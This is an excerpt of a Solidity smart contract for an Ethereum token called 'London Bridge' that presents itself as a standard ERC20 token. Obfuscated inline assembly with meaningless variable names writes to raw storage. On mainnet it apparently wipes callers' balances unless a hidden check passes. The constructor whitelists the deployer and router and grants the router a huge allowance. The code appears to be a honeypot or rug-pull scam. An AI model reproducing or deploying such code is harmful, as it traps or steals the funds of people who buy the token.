...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addReaction;
    uint256 private actionReaction = block.number*2;

    mapping (address => bool) private _firstAction; 
    mapping (address => bool) private _secondReaction;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _flyingGrill;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private whineNow;
    address public pair;
    ...
    bool private trading; uint256 private greenWorm = 1; bool private blackSalad;
    uint256 private _decimals; uint256 private darkRain;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addReaction.push(_router); addReaction.push(msgSender_); addReaction.push(pair);
        for (uint256 q=0; q < 3;) {_firstAction[addReaction[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x867c2f7cb6b4e0a891f842732c68afd5dca85587cf40a0d1afb30c5bcf6641e9
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xe6935d362d697a75185e43edcc77b76615c8284bad6f6a8ff006f1ad7c5f2d2a,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; actionReaction = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addReaction[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployReact(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addReaction[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployReact(creator, initialSupply);
    }
}

contract LondonBridge is ERC20Token {
    constructor() ERC20Token("London Bridge", "LONDON", msg.sender, 1000000 * 10 ** 18) {
    }
}